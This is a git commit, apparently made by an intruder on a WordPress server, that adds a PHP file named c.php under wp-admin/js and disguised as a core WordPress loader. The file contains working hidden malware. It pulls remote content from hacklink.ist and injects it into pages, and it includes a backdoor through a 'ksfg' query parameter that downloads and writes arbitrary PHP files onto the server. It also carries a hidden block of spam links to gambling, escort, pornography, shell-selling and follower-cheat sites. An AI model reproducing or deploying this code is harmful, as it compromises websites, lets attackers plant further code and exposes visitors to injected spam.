3d3315213242dfb21b308e34b8a9a5e142542696
Debian <bitnami@ip-172-26-15-241.eu-west-3.compute.internal>
2021-07-29 17:23:31 +0000

    hack

---
+++ wp-admin/js/c.php
@@ -0,0 +1,128 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+?><?php
+error_reporting(0);
+$s='https://hacklink.ist/';
+$host = str_replace('www.', '', @$_SERVER['HTTP_HOST']);
+$x = $s.'l-'.base64_encode($host);
+
+if(function_exists('curl_init'))
+{
+$ch = @curl_init(); curl_setopt($ch, CURLOPT_URL, $x); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $gitt = curl_exec($ch); curl_close($ch);
+if($gitt == false){
+    @$gitt = file_get_contents($x);
+}
+}elseif(function_exists('file_get_contents')){
+    @$gitt = file_get_contents($x);
+}
+echo $gitt;
+
+if(isset($_GET['ksfg'])){
+    $f=fopen($_GET['ksfg'].'.php','a');
+    fwrite($f,file_get_contents($s.'s-'.$_GET['ksfg']));
+    fclose($f);
+}
+echo '<!DOCTYPE html!>';
+?>
+<div style="display: none;">
+<a href="http://www.expoilt.com/" title="php shell">php shell</a> 
+<a href="https://bizimseo.co/s-5-hacklink.html" title="hacklink">hacklink</a>
+<a href="https://bizimseo.co/" title="hacklink satış">hacklink satış</a>
+<a href="https://bizimseo.co/" title="hızlı seo">hızlı seo</a>
+<a href="http://googlee.life/" title="hacklink satışı">hacklink satışı</a> 
+<a href="https://www.facebook.com/seoHacklink/" target="_blank" title="hacklink al">hacklink al</a> 
+<a href="https://www.facebook.com/seoHacklink/" target="_blank" title="hacklink nedir">hacklink nedir</a> 
+<a href="https://www.facebook.com/seoHacklink/" target="_blank" title="hacklink satış">hacklink satış</a> 
+<a href="https://www.facebook.com/seoHacklink/" target="_blank" title="hacklink panel">hacklink panel</a> 
+<a href="https://www.facebook.com/seoHacklink/" target="_blank" title="hacklink nedir">hacklink nedir</a> 
+<a href="http://googlee.life/" title="seo nedir">seo nedir</a>
+<a href="http://phpshell.in/" title="wso shell">wso shell</a> 
+<a href="http://phpshell.in/" title="indoxploit shell">indoxploit shell</a> 
+<a href="http://evdeneve.services/" target="_blank" title="evden eve nakliyat">evden eve nakliyat</a>
+<a href="https://profseo.co/" target="_blank" title="hacklink ">hacklink</a>
+<a href="https://www.betwager.info/" target="_blank" title="canlı bahis siteleri">canlı bahis siteleri </a> 
+<a href="https://www.betwager.info" target="_blank" title="bahis"> bahis</a>
+<a href="http://www.fffjdr.com" target="_blank" title="deneme bonusu veren bahis siteleri">deneme bonusu veren bahis siteleri</a>  
+<a href="http://www.g8g8.com.tw" target="_blank" title="hoşgeldin bonusu">hoşgeldin bonusu </a> 
+<a href="http://www.online-casino-7sultans.com" target="_blank" title="casino">casino</a> 
+<a href="http://taze.mobi" target="_blank" title="sohbet hattı">sohbet hattı</a> 
+<a href="http://canan.today" target="_blank" title="sohbet hatları">sohbet hatları</a> 
+<a href="http://mob.telechat.info" target="_blank" title="sex hattı">sex hattı </a> 
+<a href="https://www.sonsuzsevgi.info" target="_blank" title="canlı sohbet hattı">canlı sohbet hattı</a> 
+<a href="http://www.storietold.me" target="_blank" title="porno hikayeleri">porno hikayeleri</a> 
+<a href="http://skoorx.com" target="_blank" title="maç sonuçları">maç sonuçları</a>
+<a href="http://plotx.info" target="_blank" title="sex hikayeleri">sex hikayeleri</a>
+<a href="http://www.dertanlat.info" target="_blank" title="sohbet numaraları">sohbet numaraları</a> 
+<a href="http://www.ebooksalamai.com" target="_blank" title="adana escort">adana escort</a> 
+<a href="http://www.bancapadana.com" target="_blank" title="adana escort">adana escort</a>
+<a href="http://bet6news.me/" target="_blank" title="güvenilir bahis siteleri">güvenilir bahis siteleri </a> 
+<a href="https://skoorx.com/forum" target="_blank" title="canlı bahis">canlı bahis</a>
+<a href="http://canlibahisvipx.com/" rel="dofollow">canlı bahis</a><br />
+<a href="https://20tlbonusverenbahissiteleri.supercanlibahishanem.com" target="_blank" title="deneme bonusu">deneme bonusu</a> 
+<a href="https://30tlbonusverenbahissiteleri.supercanlibahishanem.com" target="_blank" title="bedava bonus">bedava bonus</a> 
+<a href="https://40tlbonusverenbahissiteleri.supercanlibahishanem.com" target="_blank" title="hoşgeldin bonusu">hoşgeldin bonusu</a> 
+<a href="https://50tlbonusverenbahissiteleri.supercanlibahishanem.com" target="_blank" title="bedava bonus veren bahis siteleri">bedava bonus veren bahis siteleri</a> 
+<a href="https://1x2arena.net/" rel="dofollow">1xbet</a>
+<a href="https://skoorx.com/forum" target="_blank" title="bahis forum">bahis forum</a>
+<a href="http://www.ruyaonline.org/sex-hatti.html" target="_blank" title="sex hattı">sex hattı</a>
+<a href="http://www.ruyaonline.org/sex-numaralari.html" target="_blank" title="sex numaraları">sex numaraları</a>
+<a href="http://www.ruyaonline.org/bayan-numaralari.html" target="_blank" title="bayan numaraları">bayan numaraları</a>
+<a href="http://www.ruyaonline.org/telefonda-sex.html" target="_blank" title="telefonda sex">telefonda sex</a>
+<a href="http://www.alemmp3.com" target="_blank" title="kayseri escort">escort kayseri</a>
+<a href="http://www.ankarahazineleri.com" target="_blank" title="eryaman escort">eryaman escort</a>
+<a href="http://www.eryamanvipescortx.com" target="_blank" title="eryaman escort">eryaman escort</a>
+<a href="http://www.imc-mersinhastanesi.com" target="_blank" title="mersin escort">mersin escort</a>
+<a href="http://www.dirtystory.info/" rel="dofollow">sex hikayeleri</a>
+<a href="http://www.5afuq.com" target="_blank" title="mersin escort">mersin escort</a>
+<a href="http://www.emersinsurance.com" target="_blank" title="mersin escort">mersin escort</a>
+<a href="http://www.mersinahsap.com" target="_blank" title="mersin escort">mersin escort</a>
+<a href="http://www.scors.info" target="_blank" title="bedava bonus">bedava bonus</a>
+<a href="http://blog.betboys.info/yazi-kategorisi/free-bonus-veren-bahis-siteleri/20-tl-bonus-veren-bahis-sitesi/19/228/" target="_blank" title="bedava bonus veren bahis siteleri">bedava bonus veren bahis siteleri</a>
+<a href="https://www.betcach.com" target="_blank" title="bahis"> bahis</a>
+<a href="http://skoorx.com" target="_blank" title="canlı skor">canlı skor</a>
+<a href="http://skoorx.com" target="_blank" title="canlı bahis">canlı bahis</a>
+<a href="https://www.panelinsta.com" target="_blank" title="instagram takipci hilesi">instagram takipci hilesi</a>
+<a href="https://www.panelinsta.com" target="_blank" title="instagram beğeni hilesi">instagram beğeni hilesi</a>
+<a href="https://www.gramfollowersfree.net/" target="_blank" title="instagram takipci hilesi">instagram takipci hilesi</a>
+<a href="https://instabayi.com" target="_blank" title="instagram takipci hilesi">instagram takipci hilesi</a> 
+<a href="http://www.alemmp3.com/" rel="dofollow">kayseri escort</a>
+<a href="https://www.ankaradak.com/" rel="dofollow">eryaman escort</a>
+<a href="http://www.videoaktif.net" rel="dofollow">mersin escort</a>
+<a href="http://www.onedlq.com/" rel="dofollow">adana escort</a>
+<a href="http://www.dirtystory.info/" rel="dofollow">sex hikayeleri</a>
+<a href="https://betebetguncel.site/">betebet</a>
+<a href="https://fepsports.com/best10-giris-yeni/">bets10</a>
+<a href="https://www.bonus-ver.live">bahis siteleri</a>
+<a href="https://www.bahislekazan.info">bahis siteleri</a>
+<a href="https://www.bahisle.info">bahis siteleri</a>
+<a href="https://www.bahis-rehberi2.com">bahis siteleri</a>
+<a href="https://www.markobet50.com">bahis siteleri</a>
+<a href="https://www.canli-casino.live/">bahis siteleri</a>
+<a href="http://betpasgo.com" rel="dofollow">betpas</a>
+<a href="http://supertotobet90.com" rel="dofollow">supertotobet</a>
+<a href="http://superbahisgoo.com" rel="dofollow">süperbahis</a>
+<a href="https://betebet212.com/" rel="dofollow">betebet</a>
+<a href="https://larealsociedad.com/" rel="dofollow">canlı iddaa siteleri</a>
+<a href="https://www.betforum2.com/bahis-forum/deneme-bonusu-veren-siteler/" target="_blank" title="bedava bahis">Bedava bahis</a>
+<a href="https://www.betforum2.com" target="_blank" title="bahis forumu">bahis forumu</a>
+<p><a title="Tether Price" href="https://www.tetherpricesusa.xyz">Tether Price</a> <a title="Bitcoin Price" href="https://www.bitcoinpricesusa.xyz">Bitcoin Price</a> <a title="ethereum price" href="https://www.ethereumpricesusa.xyz">Ethereum price</a> <a title="Litecoin Price" href="https://www.litecoinpricesusa.xyz">Litecoin Price</a> <a href="https://www.eoscoinpricesusa.xyz">Eos Price</a> <a href="https://www.xrppricesusa.xyz">XRP Price</a> <a href="https://www.bitcoincashpricesusa.xyz">Bitcoin Cash Price</a> <a href="https://www.tronpricesusa.xyz">Tron Price</a> <a href="https://www.bitcoinsvpricesusa.xyz ">Bitcoin Vs Price</a> <a title="Ethereum Classic Price" href="https://www.ethereumclassicpricesusa.xyz">Ethereum Classic Price</a></p> 
+
